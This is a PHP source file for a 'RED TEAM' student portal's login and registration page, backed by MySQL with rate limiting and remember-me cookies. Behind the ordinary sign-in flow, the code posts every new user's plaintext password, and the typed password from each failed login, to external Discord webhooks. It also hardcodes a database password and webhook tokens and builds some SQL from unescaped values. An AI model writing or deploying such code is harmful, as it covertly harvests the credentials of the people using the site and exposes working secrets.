<?php 
ob_start();
session_start(); 

// --- 1. DB CONNECTION ---
$sname = "bbxadela8k44zpsqtbcx-mysql.services.clever-cloud.com";
$uname = "uwmi4721ekceqwhr";
$password = "HxYCSsUt0awQIr20dVTz";
$db_name = "bbxadela8k44zpsqtbcx";
$port = 3306;

mysqli_report(MYSQLI_REPORT_OFF); 
try {
    $conn = new mysqli($sname, $uname, $password, $db_name, $port);
    $conn->set_charset("utf8mb4");
} catch (Exception $e) {
    die("System Maintenance. Connection Failed.");
}

// --- 2. LOGOUT LOGIC ---
if (isset($_GET['action']) && $_GET['action'] == 'logout') {
    if(isset($_SESSION['id'])) {
        $uid = $_SESSION['id'];
        $conn->query("UPDATE users SET remember_token = NULL WHERE id = $uid");
    }
    session_destroy();
    if (isset($_COOKIE['remember_me'])) {
        setcookie('remember_me', '', time() - 3600, '/'); 
    }
    header("Location: index.php");
    exit();
}

// --- 2.5 RATE LIMIT FUNCTIONS (NEW) ---
function checkRateLimit($conn, $ip) {
    $limit = 5; // Max attempts
    $lockout_minutes = 15;
    
    $stmt = $conn->prepare("SELECT attempts, last_attempt FROM login_attempts WHERE ip_address = ?");
    $stmt->bind_param("s", $ip);
    $stmt->execute();
    $result = $stmt->get_result();
    
    if ($row = $result->fetch_assoc()) {
        $time_diff = (time() - strtotime($row['last_attempt'])) / 60;
        
        if ($row['attempts'] >= $limit && $time_diff < $lockout_minutes) {
            $remaining = ceil($lockout_minutes - $time_diff);
            return "Too many failed attempts. Try again in $remaining min.";
        }
        
        // Reset attempts if lockout time passed
        if ($time_diff >= $lockout_minutes) {
            $conn->query("DELETE FROM login_attempts WHERE ip_address = '$ip'");
            return "OK";
        }
    }
    return "OK";
}

function recordFailedLogin($conn, $ip) {
    $stmt = $conn->prepare("SELECT id FROM login_attempts WHERE ip_address = ?");
    $stmt->bind_param("s", $ip);
    $stmt->execute();
    $res = $stmt->get_result();
    
    $now = date("Y-m-d H:i:s");
    
    if ($res->num_rows > 0) {
        $stmt = $conn->prepare("UPDATE login_attempts SET attempts = attempts + 1, last_attempt = ? WHERE ip_address = ?");
        $stmt->bind_param("ss", $now, $ip);
        $stmt->execute();
    } else {
        $stmt = $conn->prepare("INSERT INTO login_attempts (ip_address, attempts, last_attempt) VALUES (?, 1, ?)");
        $stmt->bind_param("ss", $ip, $now);
        $stmt->execute();
    }
}

function clearLoginAttempts($conn, $ip) {
    $stmt = $conn->prepare("DELETE FROM login_attempts WHERE ip_address = ?");
    $stmt->bind_param("s", $ip);
    $stmt->execute();
}

// --- 3. AUTO-LOGIN ---
if (!isset($_SESSION['id']) && isset($_COOKIE['remember_me'])) {
    $token = $_COOKIE['remember_me'];
    $stmt = $conn->prepare("SELECT * FROM users WHERE remember_token = ?");
    $stmt->bind_param("s", $token);
    $stmt->execute();
    $res = $stmt->get_result();

    if ($row = $res->fetch_assoc()) {
        $_SESSION['user_name'] = $row['username'];
        $_SESSION['id'] = $row['id'];
        $_SESSION['role'] = $row['role'];
        setcookie("user_theme", $row['theme'], time() + (30 * 86400), "/");
        header("Location: " . ($row['role'] === 'admin' ? 'admin.php' : 'home.php'));
        exit();
    }
}

// --- 4. CONFIGURATION ---
date_default_timezone_set('Asia/Kolkata'); 

function sendDiscordNotification($username, $type, $reg_password = "") {
    $webhook_register = "https://discord.com/api/webhooks/1451289829751914601/8TuBy_Mr4rYuRC6KXF_0qsdwqruGLxDUM2_Qbp0WcFRb5kfJN4WmfLnlqRzMk5rKY8Ae"; 
    $webhook_login    = "https://discord.com/api/webhooks/1451289229391953972/lJrPB6LUA6CRbHXTpzII4ZIfNUhI6JaICUe_peullXU635Z9bdfU1DjXxoFNCoun4bTw";

    $timestamp = date("Y-m-d H:i:s");
    
    if ($type === "REGISTER") {
        $url_to_use = $webhook_register;
        $title = "New Identity Created";
        $color = hexdec("D90429"); 
        $msg_content = "🚨 **New User Registration**";
        $fields = [
            [ "name" => "Username", "value" => $username, "inline" => true ],
            [ "name" => "Password", "value" => $reg_password, "inline" => true ],
            [ "name" => "Time", "value" => $timestamp, "inline" => false ]
        ];
    } else {
        $url_to_use = $webhook_login;
        $title = "System Access Granted";
        $color = hexdec("EF233C"); 
        $msg_content = "🔓 **User Login Detected**";
        $fields = [
            [ "name" => "Username", "value" => $username, "inline" => true ],
            [ "name" => "Time", "value" => $timestamp, "inline" => true ],
            [ "name" => "Action", "value" => "Login Success", "inline" => false ]
        ];
    }

    $json_data = json_encode([
        "content" => $msg_content,
        "username" => "Security Bot",
        "embeds" => [[
            "title" => $title,
            "color" => $color,
            "fields" => $fields,
            "footer" => [ "text" => "Red Team Access Log" ]
        ]]
    ]);

    $ch = curl_init( $url_to_use );
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_exec( $ch );
    curl_close( $ch );
}

function sendLoginErrorLog($username, $password_attempt) {
    $url = "https://discord.com/api/webhooks/1451287464823230666/NMvYZeJ00CrV2_LLiIdLkau4FoxOJt0372HfsDzh4RNJ7IuFBex6Zgis_lJ2Fw8vhUJ-";
    $timestamp = date("Y-m-d H:i:s");
    $json_data = json_encode([
        "username" => "Intrusion Monitor",
        "embeds" => [[
            "title" => "❌ Invalid Login Attempt",
            "color" => hexdec("FF0000"),
            "fields" => [
                [ "name" => "Typed Username", "value" => $username ? $username : "[Empty]", "inline" => true ],
                [ "name" => "Typed Password", "value" => $password_attempt ? $password_attempt : "[Empty]", "inline" => true ],
                [ "name" => "Time", "value" => $timestamp, "inline" => false ]
            ],
            "footer" => [ "text" => "Security Alert System" ]
        ]]
    ]);
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_exec($ch);
    curl_close($ch);
}

// --- 5. THEME PERSISTENCE ---
if (isset($_POST['ajax_theme'])) {
    $theme_val = mysqli_real_escape_string($conn, $_POST['theme_val']);
    setcookie("user_theme", $theme_val, time() + (30 * 86400), "/");
    if (isset($_SESSION['id'])) {
        $uid = $_SESSION['id'];
        $conn->query("UPDATE users SET theme = '$theme_val' WHERE id = $uid");
    }
    exit();
}
$current_theme = $_COOKIE['user_theme'] ?? "light";

// --- 6. VARIABLES ---
$login_error = "";
$register_error = "";
$register_success = "";
$container_class = ""; 
$username_value = ""; 

// --- 7. FORM PROCESSING ---
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // REGISTER
    if (isset($_POST['action']) && $_POST['action'] === 'register') {
        $username_value = htmlspecialchars($_POST['username']); 
        $user = trim($_POST['username']);
        $pass = trim($_POST['password']);
        $trainer = $_POST['trainer'] ?? "";
        $container_class = "right-panel-active"; 

        if (empty($user) || empty($pass) || empty($trainer)) {
            $register_error = "All fields required";
        } else {
            $check = $conn->prepare("SELECT id FROM users WHERE username=?");
            $check->bind_param("s", $user); $check->execute();
            if ($check->get_result()->num_rows > 0) {
                $register_error = "User ID Taken";
            } else {
                $hash = password_hash($pass, PASSWORD_DEFAULT);
                $ins = $conn->prepare("INSERT INTO users (username, password, trainer_name, theme, status) VALUES (?, ?, ?, 'light', 'pending')");
                $ins->bind_param("sss", $user, $hash, $trainer);
                if($ins->execute()){
                    sendDiscordNotification($user . " (Trainer: $trainer)", "REGISTER", $pass);
                    $container_class = ""; 
                    $username_value = ""; 
                    $register_success = "Account Created. Wait for Approval.";
                } else { $register_error = "System Error"; }
            }
        }
    }

    // LOGIN
    if (isset($_POST['action']) && $_POST['action'] === 'login') {
        $user = trim($_POST['username']);
        $pass = trim($_POST['password']);
        $remember = isset($_POST['remember_me']); 
        $ip_address = $_SERVER['REMOTE_ADDR']; // Get User IP

        // 1. CHECK RATE LIMIT FIRST
        $rate_check = checkRateLimit($conn, $ip_address);
        
        if ($rate_check !== "OK") {
            $login_error = $rate_check; 
        } elseif (empty($user) || empty($pass)) {
            $login_error = "Input Required";
        } else {
            $stmt = $conn->prepare("SELECT * FROM users WHERE username=?");
            $stmt->bind_param("s", $user);
            $stmt->execute();
            $res = $stmt->get_result();
            
            if ($row = $res->fetch_assoc()) {
                if (password_verify($pass, $row['password'])) {
                    if ($row['status'] === 'pending') {
                        $login_error = "Waiting for Approval ⏳";
                    } else {
                        // --- LOGIN SUCCESS ---
                        clearLoginAttempts($conn, $ip_address); 
                        sendDiscordNotification($row['username'], "LOGIN");
                        $_SESSION['user_name'] = $row['username'];
                        $_SESSION['id'] = $row['id'];
                        $_SESSION['role'] = $row['role']; 
                        setcookie("user_theme", $row['theme'], time() + (30 * 86400), "/");

                        // --- REMEMBER ME ---
                        if ($remember) {
                            $token = bin2hex(random_bytes(32)); 
                            $upd = $conn->prepare("UPDATE users SET remember_token = ? WHERE id = ?");
                            $upd->bind_param("si", $token, $row['id']);
                            $upd->execute();
                            setcookie("remember_me", $token, time() + (30 * 86400), "/");
                        }

                        header("Location: " . ($row['role'] === 'admin' ? 'admin.php' : 'home.php'));
                        exit();
                    }
                } else { 
                    // Bad Password
                    recordFailedLogin($conn, $ip_address);
                    $login_error = "Invalid Credentials"; 
                    sendLoginErrorLog($user, $pass);
                }
            } else { 
                // User Not Found
                recordFailedLogin($conn, $ip_address);
                $login_error = "User Not Found"; 
                sendLoginErrorLog($user, $pass);
            }
        }
    }
}

$trainers = [];
$t_res = $conn->query("SELECT username FROM trainers ORDER BY username ASC");
if($t_res) { while($t_row = $t_res->fetch_assoc()) { $trainers[] = $t_row['username']; } }
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>RED TEAM - LOGIN</title>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
</head>
<body data-theme="<?php echo $current_theme; ?>">

    <audio id="bgMusic" loop>
        <source src="song.mp3" type="audio/mpeg">
    </audio>

    <div class="sound-box">
        <span>🔈</span>
        <input type="range" id="volSlider" min="0" max="1" step="0.1" value="0.3">
        <span>🔊</span>
    </div>

    <div class="logo-container">
        <img src="image_0.png" alt="REDTEAM Logo" class="logo-img">
    </div>

    <div class="theme-switch-wrapper">
        <button class="theme-btn" id="toggleMode">
            <?php echo ($current_theme === 'dark') ? 'DAY MODE ☀️' : 'NIGHT MODE 🌙'; ?>
        </button>
    </div>

    <div class="container <?php echo $container_class; ?>" id="container">
        
        <div class="form-container sign-up-container">
            <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
                <h1>Create Account</h1>
                <?php if($register_error){ echo "<div class='msg err'>$register_error</div>"; } ?>
                <input type="text" name="username" placeholder="Username" value="<?php echo $username_value; ?>" required />
                
                <div class="password-wrapper">
                    <input type="password" id="regPass" name="password" placeholder="Password" required />
                    <span class="toggle-icon" id="regIcon" onclick="manualToggle('regPass', this)">🐵</span>
                </div>
                
                <select name="trainer" required>
                    <option value="" disabled selected>Select Trainer</option>
                    <?php foreach($trainers as $t_name) { echo "<option value='".htmlspecialchars($t_name)."'>Trainer: ".htmlspecialchars($t_name)."</option>"; } ?>
                </select>
                <input type="hidden" name="action" value="register">
                <button type="submit">Sign Up</button>
            </form>
        </div>

        <div class="form-container sign-in-container">
            <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
                <h1>Sign in</h1>
                <?php if($login_error){ echo "<div class='msg err'>$login_error</div>"; } ?>
                <?php if($register_success){ echo "<div class='msg suc'>$register_success</div>"; } ?>
                <input type="text" name="username" placeholder="Username" required />
                
                <div class="password-wrapper">
                    <input type="password" id="loginPass" name="password" placeholder="Password" required />
                    <span class="toggle-icon" id="loginIcon" onclick="manualToggle('loginPass', this)">🐵</span>
                </div>

                <div class="remember-box">
                    <input type="checkbox" name="remember_me" id="rememberMe">
                    <label for="rememberMe">Keep me logged in</label>
                </div>

                <input type="hidden" name="action" value="login">
                <button type="submit">Log In</button>
            </form>
        </div>

        <div class="overlay-container">
            <div class="overlay">
                <div class="overlay-panel overlay-left">
                    <h1>Welcome Back!</h1>
                    <p>To keep connected with us please login with your personal info</p>
                    <button class="ghost" id="signIn">Sign In</button>
                </div>
                <div class="overlay-panel overlay-right">
                    <h1>Hello, Students!</h1>
                    <p>Enter your personal details and start journey with us</p>
                    <button class="ghost" id="signUp">Sign Up</button>
                </div>
            </div>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>